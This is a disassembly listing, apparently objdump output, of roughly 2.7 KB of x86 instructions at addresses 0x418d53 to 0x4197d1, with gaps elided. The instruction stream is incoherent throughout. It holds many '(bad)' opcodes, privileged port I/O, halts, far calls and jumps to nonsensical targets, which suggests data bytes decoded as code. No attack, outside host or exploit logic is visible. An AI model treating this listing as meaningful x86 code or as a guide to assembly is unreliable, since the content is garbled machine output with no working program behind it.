  418d53:	lock fiadd DWORD PTR [eax]
  418d56:	aaa    
  418d57:	xor    ch,BYTE PTR [ecx]
  418d59:	aam    0xd8
  418d5b:	cmp    bh,BYTE PTR [esi]
  418d5d:	mov    ebp,0xf96f2b6a
  418d62:	loop   0x418da2
  418d64:	push   0xffffffca
  418d66:	cmc    
  418d67:	xor    edx,0x46b0f1f7
  418d6d:	xor    ebp,DWORD PTR [edi+edx*4]
  418d70:	call   0x3cd5c304
  418d75:	cmc    
  418d76:	rcr    DWORD PTR ds:0xe7cde610,cl
  418d7c:	fs add al,0xd6
  418d7f:	call   0x8b46d8b1
  418d84:	xchg   esp,eax
  418d85:	jo     0x418dbd
  418d87:	stos   BYTE PTR es:[edi],al
  418d88:	dec    esp
  418d89:	jbe    0x418d69
  418d8b:	xchg   edi,eax
  418d8c:	mov    cl,0x9
  418d8e:	sub    ebp,DWORD PTR [edx+0x1b]
  418d91:	mov    eax,0x3898217d
  418d96:	outs   dx,DWORD PTR ds:[esi]
  418d97:	cmp    BYTE PTR [ebx],bh
  418d99:	scas   al,BYTE PTR es:[edi]
  418d9a:	mov    bl,0x82
  418d9c:	xchg   edx,eax
  418d9d:	push   esi
  418d9e:	(bad)  
  418d9f:	stc    
  418da0:	push   0xffffffab
  418da2:	ds push edx
  418da4:	das    
  418da5:	sub    ch,BYTE PTR [edi+0x35]
  418da8:	xor    al,0xef
  418daa:	out    0x6,eax
  418dac:	repz ficomp WORD PTR [esi+0x41]
  418db0:	(bad)  
  418db1:	call   0xf7e4:0xd05ca6b8
  418db8:	mov    edx,0xda2fd3e5
  418dbd:	jle    0x418d70
  418dbf:	sbb    edx,DWORD PTR [ecx+0xe0f4aed]
  418dc5:	jp     0x418e0b
  418dc7:	jg     0x418e0f
  418dc9:	out    0x2a,al
  418dcb:	and    BYTE PTR [ebx+0xdf5a321],al
  418dd1:	push   esi
  418dd2:	fnstcw WORD PTR [ebx+0xe]
  418dd5:	and    dl,BYTE PTR [esi]
  418dd7:	add    eax,0x3b35f3c1
  418ddc:	xchg   ebx,eax
  418ddd:	jl     0x418dba
  418ddf:	sub    DWORD PTR [ebp-0x5d],ecx
  418de2:	clc    
  418de3:	(bad)  
  418de4:	push   0x38ba1c0b
  418de9:	mov    bh,0xbe
  418deb:	mov    ah,0x34
  418ded:	cmp    eax,0xee1f5b13
  418df2:	inc    ecx
  418df3:	and    BYTE PTR [edx-0x49926a27],bh
  418df9:	and    ebp,ebp
  418dfb:	in     eax,dx
  418dfc:	leave  
  418dfd:	xchg   BYTE PTR [edi],al
  418dff:	jg     0x418e38
  418e01:	loop   0x418d88
  418e03:	sbb    DWORD PTR [edi-0x4b9df543],edi
  418e09:	in     eax,0x8d
  418e0b:	mov    bh,0x87
  418e0d:	mov    edi,0x67bc
	...
  418e72:	add    BYTE PTR [eax],al
  418e74:	push   cs
  418e75:	bnd call 0xde7c8aab
  418e7b:	dec    dl
  418e7d:	leave  
  418e7e:	and    ah,BYTE PTR [edx+0x2f]
  418e81:	scas   al,BYTE PTR es:[edi]
  418e82:	cmc    
  418e83:	mov    BYTE PTR [eax+0x4000107],dh
  418e89:	add    DWORD PTR [eax],eax
  418e8b:	add    cl,bh
  418e8d:	xor    eax,0x6b848102
  418e92:	mov    WORD PTR [eax+0x5b],?
  418e95:	xor    al,0xb5
  418e97:	test   DWORD PTR [edi+0x64],esi
  418e9a:	pop    eax
  418e9b:	push   ecx
  418e9c:	sub    ebp,DWORD PTR [ebp+ebp*2-0x68]
  418ea0:	ds inc esp
  418ea2:	dec    ebp
  418ea3:	or     al,0x74
  418ea5:	add    eax,0xde81de4a
  418eaa:	cdq    
  418eab:	sub    DWORD PTR ds:0xca254db0,edi
  418eb1:	xchg   esi,eax
  418eb2:	push   edx
  418eb3:	cmc    
  418eb4:	sbb    DWORD PTR [ecx+eiz*1],esi
  418eb7:	xor    cl,ch
  418eb9:	dec    edx
  418eba:	sti    
  418ebb:	loope  0x418e54
  418ebd:	je     0x418e51
  418ebf:	or     eax,0xd36031da
  418ec4:	into   
  418ec5:	cwde   
  418ec6:	scas   al,BYTE PTR es:[edi]
  418ec7:	pop    edi
  418ec8:	aad    0xab
  418eca:	outs   dx,DWORD PTR ds:[esi]
  418ecb:	bound  edi,QWORD PTR [ebp+ecx*4+0x36]
  418ecf:	cli    
  418ed0:	sbb    DWORD PTR [ebx+0x69bbe3ef],ebp
  418ed6:	aaa    
  418ed7:	mov    al,0x61
  418ed9:	pop    edi
  418eda:	mov    DWORD PTR [edx],ebp
  418edc:	mov    esi,0x5e60f823
  418ee1:	mov    edx,0x8ead35a9
  418ee6:	stos   BYTE PTR es:[edi],al
  418ee7:	mov    esi,0x2972fa5b
  418eec:	jns    0x418eef
  418eee:	out    dx,eax
  418eef:	imul   esp,DWORD PTR [ebp+0x12],0xe46e630d
  418ef6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ef7:	mov    esi,0x4a62723b
  418efc:	cmp    BYTE PTR [edi-0x792a244b],al
  418f02:	stc    
  418f03:	into   
  418f04:	js     0x418f11
  418f06:	mov    cl,0x21
  418f08:	xor    al,0xf5
  418f0a:	or     eax,DWORD PTR [ecx]
  418f0c:	pusha  
  418f0d:	aaa    
  418f0e:	cld    
  418f0f:	popf   
  418f10:	loope  0x418ee1
  418f12:	lods   al,BYTE PTR ds:[esi]
  418f13:	jbe    0x418f74
  418f15:	push   edi
  418f16:	pop    esp
  418f17:	or     eax,0x26dd0c33
  418f1c:	add    DWORD PTR [esi-0x37b55cfe],0x14ebaff0
  418f26:	add    esi,DWORD PTR [edi+0x5]
  418f29:	ror    edi,0x41
  418f2c:	inc    esp
  418f2d:	dec    ebp
  418f2e:	xor    al,0xa4
  418f30:	mov    gs,esi
  418f32:	inc    eax
  418f33:	dec    esp
  418f34:	test   eax,0x9622b9fd
  418f39:	push   0x26f502e8
  418f3e:	ror    DWORD PTR [ecx+0x5ce34d1a],1
  418f44:	mov    BYTE PTR [edi-0x2f],ah
  418f47:	xchg   ecx,eax
  418f48:	loope  0x418fb0
  418f4a:	mov    bl,0x19
  418f4c:	imul   BYTE PTR [esi]
  418f4e:	xchg   ebx,eax
  418f4f:	imul   ecx,DWORD PTR [ecx-0x5c267b29],0x24
  418f56:	add    al,0x26
  418f58:	lahf   
  418f59:	pop    edi
  418f5a:	test   BYTE PTR [ebx-0x40635ead],0xc7
  418f61:	pop    ds
  418f62:	pop    ebp
  418f63:	cmp    BYTE PTR ds:0x7bbc6d4,dh
  418f69:	rcr    cl,1
  418f6b:	sub    ch,bh
  418f6d:	xchg   ecx,eax
  418f6e:	cdq    
  418f6f:	xchg   edx,eax
  418f70:	imul   edx,edx,0xa8caad3c
  418f76:	jb     0x418f50
  418f78:	dec    esp
  418f79:	sub    BYTE PTR es:[ebx-0x48267b02],bh
  418f80:	rcr    BYTE PTR ds:0x486f0dce,0xa4
  418f87:	cwde   
  418f88:	neg    BYTE PTR [eax-0x20]
  418f8b:	ret    0x4f54
  418f8e:	clc    
  418f8f:	or     eax,DWORD PTR [eax]
	...
  418ff1:	add    BYTE PTR [eax],al
  418ff3:	add    BYTE PTR [edi+edx*4],bl
  418ff6:	in     al,0x47
  418ff8:	out    dx,eax
  418ff9:	ja     0x418fba
  418ffb:	fild   WORD PTR [ecx-0xc150e59]
  419001:	xor    BYTE PTR [ecx+0x108b42f],0x0
  419008:	add    al,0x1
  41900a:	add    BYTE PTR [eax],al
  41900c:	sbb    esi,DWORD PTR [ebx+0x705dd845]
  419012:	scas   eax,DWORD PTR es:[edi]
  419013:	mov    cl,0xed
  419015:	jl     0x419080
  419017:	daa    
  419018:	test   DWORD PTR [esp+ebx*4-0x12b5d68c],ebp
  41901f:	inc    edi
  419020:	jne    0x41903d
  419022:	mov    ds:0xaadcc9af,al
  419027:	mov    edx,0x4bf9767d
  41902c:	enter  0xe855,0xc1
  419030:	pop    esp
  419031:	pusha  
  419032:	cmp    eax,0x98aed1ab
  419037:	popa   
  419038:	aam    0x5e
  41903a:	or     ebp,DWORD PTR [ebx]
  41903c:	pop    edx
  41903d:	je     0x4190ab
  41903f:	arpl   dx,sp
  419041:	mov    DWORD PTR [ecx],esp
  419043:	jge    0x41907b
  419045:	inc    esp
  419046:	jno    0x419089
  419048:	lahf   
  419049:	popa   
  41904a:	out    0xd1,al
  41904c:	jnp    0x4190ab
  41904e:	inc    ebx
  41904f:	xor    BYTE PTR [edi+ecx*8+0x383bc29d],bh
  419056:	js     0x419028
  419058:	fisub  DWORD PTR ds:0x842f7768
  41905e:	les    ecx,FWORD PTR [eax]
  419060:	add    eax,0x8ea85e9
  419065:	sub    BYTE PTR [ebp-0x5250c2be],bl
  41906b:	data16 or dh,BYTE PTR [esp+edi*1-0x4a]
  419070:	sbb    DWORD PTR [esi-0x442e2bb7],ecx
  419076:	mov    esi,DWORD PTR [ecx+0x5d]
  419079:	cli    
  41907a:	sbb    ch,BYTE PTR [ecx]
  41907c:	imul   ecx,DWORD PTR [ebx+0x1af0f360],0x8839e96a
  419086:	xor    dl,BYTE PTR [edx-0x5d]
  419089:	dec    esp
  41908a:	dec    ebp
  41908b:	sbb    DWORD PTR [edi],0x24
  41908e:	ror    BYTE PTR [edi+esi*8-0x5e02592b],0xcf
  419096:	jo     0x419049
  419098:	fwait
  419099:	shl    al,cl
  41909b:	test   al,0x86
  41909d:	lea    eax,[ebx+0x43bd9824]
  4190a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4190a4:	inc    ebx
  4190a5:	or     BYTE PTR [esp+edx*1+0x46],bh
  4190a9:	(bad)  
  4190ab:	pop    ss
  4190ac:	ds inc esi
  4190ae:	fstp   DWORD PTR [edi]
  4190b0:	call   0xfe57e4a3
  4190b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4190b6:	pop    ebp
  4190b7:	fs hlt 
  4190b9:	jnp    0x41908f
  4190bb:	xor    DWORD PTR [ecx-0x6c],esp
  4190be:	jmp    0xb22592af
  4190c3:	scas   eax,DWORD PTR es:[edi]
  4190c4:	mov    eax,ds:0x7cf6cb1f
  4190c9:	rcl    BYTE PTR [edi],1
  4190cb:	les    ebp,FWORD PTR [esi+0x48]
  4190ce:	dec    edi
  4190cf:	inc    edx
  4190d0:	mov    edi,0x20bcf5f4
  4190d5:	sub    ch,BYTE PTR [edi+ebx*2+0xf663f72]
  4190dc:	sub    eax,0x94495689
  4190e1:	ret    0x5fba
  4190e4:	repnz add esi,ebx
  4190e7:	jp     0x41907c
  4190e9:	(bad)  
  4190ea:	aad    0x12
  4190ec:	in     al,0xa9
  4190ee:	sbb    cl,BYTE PTR [edx+esi*1+0x72697b73]
  4190f5:	loopne 0x419161
  4190f7:	stos   BYTE PTR es:[edi],al
  4190f8:	xor    DWORD PTR [ecx+0x7a0ea352],esp
  4190fe:	sub    edx,0xa9a304fc
  419104:	fild   DWORD PTR [eax]
  419106:	or     dh,cl
  419108:	out    0x3d,al
  41910a:	jmp    DWORD PTR [edx+esi*1+0x37]
  41910e:	cmp    dl,dh
	...
  419174:	scas   eax,DWORD PTR es:[edi]
  419175:	test   DWORD PTR [esi-0xa441be],ebx
  41917b:	in     eax,dx
  41917c:	inc    esi
  41917d:	push   0x4d
  41917f:	or     ah,BYTE PTR [ebp+0x2b]
  419182:	sbb    ebp,edx
  419184:	mov    eax,0x4000109
  419189:	add    DWORD PTR [eax],eax
  41918b:	add    BYTE PTR [ebx+edx*4],bl
  41918e:	fs rcr ebx,cl
  419191:	or     al,0x6e
  419193:	hlt    
  419194:	dec    edx
  419195:	sub    al,0x37
  419197:	sbb    dl,al
  419199:	push   DWORD PTR [edi-0x7bd8b278]
  41919f:	xchg   edx,eax
  4191a0:	and    DWORD PTR [ebx+0x653c9e77],ebp
  4191a6:	call   0x82e6d1ca
  4191ab:	gs scas eax,DWORD PTR es:[edi]
  4191ad:	iret   
  4191ae:	stos   BYTE PTR es:[edi],al
  4191af:	inc    edx
  4191b0:	ds push esi
  4191b2:	sub    DWORD PTR [edi+0x6740c1b0],ebx
  4191b8:	out    0x5d,eax
  4191ba:	mov    eax,ds:0x1322e4e0
  4191bf:	dec    ebx
  4191c0:	jle    0x4191af
  4191c2:	and    al,0x87
  4191c4:	inc    esp
  4191c5:	mov    dl,0x7c
  4191c7:	fsub   QWORD PTR [esi]
  4191c9:	(bad)  
  4191ca:	or     DWORD PTR ss:[ecx+0x53f5793a],edi
  4191d1:	push   es
  4191d2:	sar    esi,1
  4191d4:	int    0x51
  4191d6:	retf   0x2095
  4191d9:	xor    dh,BYTE PTR [esi]
  4191db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4191dc:	(bad)  
  4191dd:	bound  esp,QWORD PTR [ecx+esi*8-0x4bd3d583]
  4191e4:	imul   esi,ebx,0xffffffb3
  4191e7:	test   eax,0x31ff99b
  4191ec:	icebp  
  4191ed:	je     0x41918f
  4191ef:	sbb    ebx,DWORD PTR [ebp+ebp*2+0x7e]
  4191f3:	popa   
  4191f4:	push   edi
  4191f5:	cli    
  4191f6:	mov    DWORD PTR [ecx-0x32],ecx
  4191f9:	dec    esi
  4191fa:	mov    cs,WORD PTR [ecx]
  4191fc:	cmp    DWORD PTR [eax],esp
  4191fe:	sqrtps xmm5,XMMWORD PTR [esi]
  419201:	(bad)  
  419202:	pop    edi
  419203:	gs (bad) 
  419205:	xchg   edi,eax
  419206:	call   0x79a5:0xf06bd702
  41920d:	jmp    ebp
  41920f:	or     eax,0x9984db89
  419214:	push   es
  419215:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419216:	nop
  419217:	js     0x419250
  419219:	sti    
  41921a:	jnp    0x4191f3
  41921c:	mov    ds:0xadb4f824,al
  419221:	data16 sub ah,BYTE PTR [edi-0x37bdc75b]
  419228:	jle    0x41928f
  41922a:	(bad)  
  41922b:	xor    dl,BYTE PTR [eax+ecx*8-0x20]
  41922f:	test   BYTE PTR [edi+0x5934ad08],0x4d
  419236:	inc    ecx
  419237:	mov    eax,0xef5c44da
  41923c:	jmp    0x545b13ed
  419241:	mov    esp,0xb44c3387
  419246:	jo     0x41920e
  419248:	scas   eax,DWORD PTR es:[edi]
  419249:	jb     0x4192a8
  41924b:	add    eax,DWORD PTR [eax+edx*8]
  41924e:	dec    ecx
  41924f:	int3   
  419250:	clc    
  419251:	xchg   edi,eax
  419252:	imul   esp,esi,0x52
  419255:	in     eax,0x4
  419257:	add    DWORD PTR [edx+0x22],esp
  41925a:	jb     0x41922d
  41925c:	mov    ds:0x4ea9c9c,eax
  419261:	pop    ds
  419262:	out    dx,al
  419263:	mov    BYTE PTR [ecx-0x5e],dl
  419266:	mov    BYTE PTR [esp+ebp*2-0x5e205f3f],al
  41926d:	imul   ebp,eax,0x44
  419270:	or     ebx,esi
  419272:	arpl   WORD PTR [edx-0x305576f6],dx
  419278:	xor    bl,BYTE PTR [eax+ebp*2-0x2d3b1bcd]
  41927f:	pop    esp
  419280:	push   edi
  419281:	aas    
  419282:	adc    eax,0xa061c682
  419287:	mov    ds:0x4a3f4242,al
  41928c:	ins    DWORD PTR es:[edi],dx
  41928d:	ins    DWORD PTR es:[edi],dx
  41928e:	sub    DWORD PTR [edx],ecx
	...
  4192f4:	mov    al,ds:0xff33bae7
  4192f9:	jg     0x4192a4
  4192fb:	neg    eax
  4192fd:	pop    ss
  4192fe:	daa    
  4192ff:	inc    edi
  419300:	dec    esp
  419301:	add    ah,BYTE PTR [ecx+0x10abcd7]
  419307:	add    BYTE PTR [ecx+eax*1],al
  41930a:	add    BYTE PTR [eax],al
  41930c:	push   esi
  41930d:	or     al,0x46
  41930f:	ins    BYTE PTR es:[edi],dx
  419310:	fldcw  WORD PTR [ebp+0x4b]
  419313:	xlat   BYTE PTR ds:[ebx]
  419314:	or     BYTE PTR [edi+0xf],dl
  419317:	sbb    BYTE PTR [edx+0x223f50d4],cl
  41931d:	iret   
  41931e:	xor    ah,ah
  419320:	mov    ebx,0x8caa93
  419325:	or     BYTE PTR [eax-0x6f75d045],dh
  41932b:	pop    edx
  41932c:	xchg   ebp,eax
  41932d:	xor    al,0x85
  41932f:	sbb    edx,DWORD PTR [eax]
  419331:	rol    BYTE PTR [esi],cl
  419333:	dec    ebp
  419334:	inc    edx
  419335:	add    dl,BYTE PTR [ecx+0xa419b54]
  41933b:	jbe    0x419355
  41933d:	ror    esi,cl
  41933f:	jb     0x4193b9
  419341:	mov    al,0x4
  419343:	xor    esp,DWORD PTR [edi]
  419345:	das    
  419346:	mov    bh,0xf5
  419348:	sbb    BYTE PTR [eax-0x34],bl
  41934b:	cdq    
  41934c:	pop    esi
  41934d:	adc    DWORD PTR [eax],ebp
  41934f:	and    eax,0x85a7e777
  419354:	(bad)  
  419355:	add    al,0x1d
  419357:	(bad)  
  419358:	std    
  419359:	(bad)  
  41935a:	push   0xffffffc1
  41935c:	jmp    0x41931f
  41935e:	pop    eax
  41935f:	nop
  419360:	adc    DWORD PTR [eax+0x54],esi
  419363:	push   ebp
  419364:	xlat   BYTE PTR ds:[ebx]
  419365:	mov    ds:0x20df36a3,eax
  41936a:	fcmovnb st,st(2)
  41936c:	sub    BYTE PTR [edx+0x33],bh
  41936f:	das    
  419370:	jmp    0xbefec0c0
  419375:	(bad)  
  419376:	and    BYTE PTR [edx+0x53],ah
  419379:	jecxz  0x419384
  41937b:	retf   0xaa77
  41937e:	mov    ds:0xf0a7a689,eax
  419383:	mov    ds:0xd9b22c69,al
  419388:	add    ah,BYTE PTR [ebp+eax*2-0xe]
  41938c:	jecxz  0x4193fc
  41938e:	push   0x81e715aa
  419393:	xchg   edi,eax
  419394:	icebp  
  419395:	adc    BYTE PTR [eax],ch
  419397:	xchg   ecx,eax
  419398:	(bad)  
  419399:	mov    eax,?
  41939b:	pop    ss
  41939c:	and    DWORD PTR [ecx],eax
  41939e:	adc    ecx,0xf1bbd34b
  4193a4:	adc    al,0xc2
  4193a6:	jp     0x419422
  4193a8:	adc    ch,BYTE PTR [ecx]
  4193aa:	xor    al,0x73
  4193ac:	loop   0x419429
  4193ae:	push   edi
  4193af:	aam    0xb2
  4193b1:	hlt    
  4193b2:	cmc    
  4193b3:	add    edx,DWORD PTR ds:0xc76ae43e
  4193b9:	mov    ebx,0x19ada1a9
  4193be:	sub    al,0x11
  4193c0:	jbe    0x419377
  4193c2:	repz xchg edi,eax
  4193c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4193c5:	scas   eax,DWORD PTR es:[edi]
  4193c6:	pop    ebp
  4193c7:	xor    eax,0xc3370a53
  4193cc:	adc    eax,0xdd0bc39
  4193d1:	pop    edx
  4193d2:	inc    ebp
  4193d3:	(bad)  
  4193d5:	cmp    DWORD PTR [eax+0x27],0x59a603f
  4193dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4193dd:	les    ecx,FWORD PTR [eax-0x8]
  4193e0:	mov    bh,0x3
  4193e2:	sti    
  4193e3:	in     al,0x5e
  4193e5:	push   esp
  4193e6:	repz jne 0x419435
  4193e9:	fstp   DWORD PTR [ebx+eiz*1+0x2e06ed96]
  4193f0:	jo     0x41943d
  4193f2:	pop    ss
  4193f3:	arpl   di,dx
  4193f5:	clc    
  4193f6:	jl     0x41941e
  4193f8:	cmp    DWORD PTR [ebx-0x3c],0x6a1c3f92
  4193ff:	or     al,0x67
  419401:	and    DWORD PTR [ebx+0x14],edi
  419404:	mul    al
  419406:	push   edx
  419407:	inc    edx
  419408:	ret    0x8f0a
  41940b:	stos   DWORD PTR es:[edi],eax
  41940c:	push   eax
  41940d:	mov    ebp,0x327e
	...
  419472:	add    BYTE PTR [eax],al
  419474:	cmp    eax,0xed3a6998
  419479:	sti    
  41947a:	jg     0x41941b
  41947c:	cmp    ebx,esi
  41947e:	je     0x419446
  419480:	in     eax,0xf4
  419482:	scas   eax,DWORD PTR es:[edi]
  419483:	or     al,0xc0
  419485:	or     eax,DWORD PTR [ecx]
  419487:	add    BYTE PTR [ecx+eax*1],al
  41948a:	add    BYTE PTR [eax],al
  41948c:	cmp    dh,BYTE PTR [ebx-0x22]
  41948f:	sub    eax,0x6003c72c
  419494:	cmovnp ebx,eax
  419497:	and    BYTE PTR [edx-0x3f570c79],0x50
  41949e:	and    DWORD PTR ds:0x6f3353e,edi
  4194a4:	stos   BYTE PTR es:[edi],al
  4194a5:	cwde   
  4194a6:	jne    0x419434
  4194a8:	scas   eax,DWORD PTR es:[edi]
  4194a9:	test   al,0x92
  4194ab:	cmp    ebx,DWORD PTR [esi-0x5ccd1f1f]
  4194b1:	inc    esi
  4194b2:	and    ch,dh
  4194b4:	imul   esp,DWORD PTR [ebx-0x6b],0x64159708
  4194bb:	mov    bl,BYTE PTR [ecx]
  4194bd:	in     al,dx
  4194be:	fnstcw WORD PTR [ebp+0x54]
  4194c1:	repz lahf 
  4194c3:	mov    ch,0xfd
  4194c5:	jbe    0x419524
  4194c7:	fidiv  WORD PTR [ecx]
  4194c9:	(bad)  
  4194ca:	mov    ebx,0x272ee0b2
  4194cf:	shl    ebx,cl
  4194d1:	hlt    
  4194d2:	mov    edi,DWORD PTR [edx+0x20c71719]
  4194d8:	daa    
  4194d9:	fs mov ah,0x1f
  4194dc:	push   ss
  4194dd:	mov    al,0x48
  4194df:	push   ebp
  4194e0:	mov    dh,0x5e
  4194e2:	and    bl,BYTE PTR [eax-0x68c8ae31]
  4194e8:	shr    DWORD PTR [esp+eiz*2-0x79],0xbe
  4194ed:	ja     0x41955a
  4194ef:	in     eax,dx
  4194f0:	inc    esp
  4194f1:	(bad)  
  4194f2:	int3   
  4194f3:	xchg   ecx,eax
  4194f4:	sti    
  4194f5:	inc    ecx
  4194f6:	rol    edx,1
  4194f8:	mov    cl,0x1c
  4194fa:	aaa    
  4194fb:	or     cl,BYTE PTR [esp+esi*2]
  4194fe:	retf   
  4194ff:	sti    
  419500:	pop    ds
  419501:	enter  0xfc29,0xf6
  419505:	loope  0x419504
  419507:	ret    
  419508:	fwait
  419509:	loop   0x419549
  41950b:	aam    0x52
  41950d:	bound  esi,QWORD PTR [ecx]
  41950f:	add    ecx,DWORD PTR [esi-0x4bb1bd02]
  419515:	cmp    BYTE PTR [eax-0x4f],al
  419518:	cmp    edx,DWORD PTR [eax+0x2d]
  41951b:	(bad)  
  41951c:	out    dx,eax
  41951d:	push   ds
  41951e:	sbb    BYTE PTR ds:0x682e776,0x60
  419525:	jnp    0x4194b2
  419527:	jmp    0x1711:0x9b6857d1
  41952e:	dec    esi
  41952f:	inc    ecx
  419530:	imul   esi,DWORD PTR [ecx+0x16],0xdce2d5eb
  419537:	scas   al,BYTE PTR es:[edi]
  419538:	out    dx,eax
  419539:	in     eax,dx
  41953a:	test   BYTE PTR [esi+0x7d],bl
  41953d:	mov    BYTE PTR [esi],bl
  41953f:	jns    0x41958e
  419541:	inc    edx
  419542:	bound  ebx,QWORD PTR [eax-0x61]
  419545:	xchg   ebp,eax
  419546:	mov    al,ds:0xac660827
  41954b:	lahf   
  41954c:	fwait
  41954d:	test   eax,0x8cf35f5
  419552:	mov    edi,0x2b43f060
  419557:	sti    
  419558:	addr16 mov ah,0x7f
  41955b:	fwait
  41955c:	cli    
  41955d:	out    0xe6,al
  41955f:	adc    DWORD PTR [edi],esi
  419561:	and    eax,0x846cf551
  419566:	call   0x3071:0x2f8dfb17
  41956d:	dec    eax
  41956e:	mov    BYTE PTR [edi-0x3f],cl
  419571:	imul   ebx,DWORD PTR [eax-0xa2c00b6],0x2f
  419578:	adc    DWORD PTR [ebx],ecx
  41957a:	fimul  WORD PTR [esi+0x52c1fb84]
  419580:	xor    al,0x9f
  419582:	test   eax,0x5ab12df2
  419587:	inc    edx
  419588:	adc    cl,BYTE PTR [ebx+0x7bb900ce]
  41958e:	add    DWORD PTR [ebp+0x0],ecx
	...
  4195f4:	scas   eax,DWORD PTR es:[edi]
  4195f5:	aam    0x8d
  4195f7:	(bad)  
  4195f8:	(bad)  
  4195f9:	jnp    0x4195ea
  4195fb:	fstp   st(1)
  4195fd:	fcomp  QWORD PTR [ebx+0x2f]
  419600:	sar    DWORD PTR [ecx+0xcc4a33d],1
  419606:	add    DWORD PTR [eax],eax
  419608:	add    al,0x1
  41960a:	add    BYTE PTR [eax],al
  41960c:	jne    0x4195d6
  41960e:	cwde   
  41960f:	lods   al,BYTE PTR ds:[esi]
  419610:	in     eax,0x55
  419612:	lds    eax,FWORD PTR [esi+0x5d8855c3]
  419618:	xor    eax,0xcd008908
  41961d:	ins    BYTE PTR es:[edi],dx
  41961e:	sub    edx,DWORD PTR [ecx]
  419620:	in     eax,0xe1
  419622:	mov    ch,0xcb
  419624:	inc    esp
  419625:	in     eax,dx
  419626:	xchg   ebp,eax
  419627:	mov    eax,ds:0x1cead641
  41962c:	call   0x1e5b:0xfdf5bad3
  419633:	cld    
  419634:	jle    0x4195c0
  419636:	je     0x419639
  419638:	xor    edi,DWORD PTR [edi-0x6c]
  41963b:	xor    ch,BYTE PTR [ebx+0x2405524f]
  419641:	and    cl,al
  419643:	lahf   
  419644:	inc    edi
  419645:	mov    ecx,DWORD PTR ds:0xc95b35c4
  41964b:	add    eax,0xf0ced59
  419650:	sub    eax,DWORD PTR [edi+0x16]
  419653:	pop    eax
  419654:	shr    ebp,1
  419656:	out    dx,al
  419657:	mov    esp,0x53a70ffa
  41965c:	ja     0x41965c
  41965e:	and    BYTE PTR [eax],bl
  419660:	cmp    bl,BYTE PTR [edi+0x634e28f7]
  419666:	stos   BYTE PTR es:[edi],al
  419667:	stos   DWORD PTR es:[edi],eax
  419668:	dec    ebx
  419669:	push   es
  41966a:	xchg   esi,eax
  41966b:	sub    eax,0x3eecb443
  419670:	popf   
  419671:	das    
  419672:	cmp    BYTE PTR [esi+0x5e481392],dl
  419678:	mov    al,0x5
  41967a:	mov    dh,0x7b
  41967c:	out    dx,al
  41967d:	cdq    
  41967e:	xchg   ebp,eax
  41967f:	mov    eax,0x2cbcf81e
  419684:	adc    eax,DWORD PTR [eax-0x594f1a5a]
  41968a:	xlat   BYTE PTR ds:[ebx]
  41968b:	cmp    esp,DWORD PTR [edx+0x7b]
  41968e:	int3   
  41968f:	arpl   WORD PTR [edi],bp
  419691:	xchg   ecx,eax
  419692:	pop    ebx
  419693:	out    dx,eax
  419694:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419695:	ins    DWORD PTR es:[edi],dx
  419696:	loop   0x4196e9
  419698:	push   0x18
  41969a:	mov    bl,0x8
  41969c:	pop    esi
  41969d:	fbld   TBYTE PTR [ebx+ebx*2+0x262415e]
  4196a4:	xchg   ebp,eax
  4196a5:	inc    ecx
  4196a6:	fst    QWORD PTR [ebx]
  4196a8:	gs pop eax
  4196aa:	or     al,0x28
  4196ac:	icebp  
  4196ad:	div    dh
  4196af:	lods   al,BYTE PTR ds:[esi]
  4196b0:	mov    edx,esi
  4196b2:	shr    DWORD PTR [ebp-0x70],cl
  4196b5:	lods   eax,DWORD PTR ds:[esi]
  4196b6:	js     0x41968d
  4196b8:	out    0x9d,eax
  4196ba:	ds (bad) 
  4196bc:	mov    ah,0x7e
  4196be:	sub    bh,BYTE PTR [ecx]
  4196c0:	repnz fs (bad) 
  4196c4:	repz stc 
  4196c6:	mov    fs,WORD PTR [edx]
  4196c8:	xor    esi,DWORD PTR [ecx+0x7fd1bfb1]
  4196ce:	dec    ecx
  4196cf:	push   0xffffffd9
  4196d1:	cwde   
  4196d2:	or     edi,ecx
  4196d4:	out    dx,al
  4196d5:	mov    edx,0xc0995539
  4196da:	and    BYTE PTR [esi-0x405c4b34],cl
  4196e0:	jns    0x4196db
  4196e2:	je     0x4196ef
  4196e4:	(bad)
  4196e7:	retf   0x6e3
  4196ea:	jbe    0x4196c8
  4196ec:	mov    esi,0x709f4ee
  4196f1:	or     eax,0x5d2c4ff9
  4196f6:	js     0x4196a4
  4196f8:	scas   al,BYTE PTR es:[edi]
  4196f9:	cmp    DWORD PTR [ecx],edi
  4196fb:	(bad)  [edx+eiz*4-0x14]
  4196ff:	sub    DWORD PTR [eax-0x6db8a6f2],eax
  419705:	inc    edx
  419706:	xchg   esi,eax
  419707:	mov    WORD PTR [edi+0x2dc6c6fa],cs
  41970d:	punpcklwd mm5,mm0
	...
  419774:	mov    bl,0x3f
  419776:	jno    0x4197dd
  419778:	std    
  419779:	outs   dx,DWORD PTR ds:[esi]
  41977a:	mov    bh,0xff
  41977c:	add    eax,0x648dd0ae
  419781:	pop    esi
  419782:	cs xchg edx,eax
  419784:	enter  0x10d,0x0
  419788:	add    al,0x1
  41978a:	add    BYTE PTR [eax],al
  41978c:	cmp    al,0x66
  41978e:	and    al,0x7b
  419790:	lahf   
  419791:	jb     0x419791
  419793:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419794:	mov    ebx,0xcb79cd9e
  419799:	xor    BYTE PTR ds:0xa7aa6f13,0x44
  4197a0:	jnp    0x4197ea
  4197a2:	xchg   esp,eax
  4197a3:	xor    cx,WORD PTR [edx]
  4197a6:	test   DWORD PTR [esi+edi*4-0x605eda5a],edi
  4197ad:	or     DWORD PTR gs:[eax],ebx
  4197b0:	mov    DWORD PTR ss:[eax-0x4b],edx
  4197b4:	xchg   edx,eax
  4197b5:	std    
  4197b6:	outs   dx,DWORD PTR ds:[esi]
  4197b7:	mov    bh,0x7c
  4197b9:	mov    ecx,0xfbcf1690
  4197be:	mov    ecx,0xa15099a8
  4197c3:	retf   0xe151
  4197c6:	daa    
  4197c7:	ret    0x5cd1
  4197ca:	ins    BYTE PTR es:[edi],dx
  4197cb:	xor    dh,0x28
  4197ce:	fld    QWORD PTR [ebx+0x26]
  4197d1:	iret   
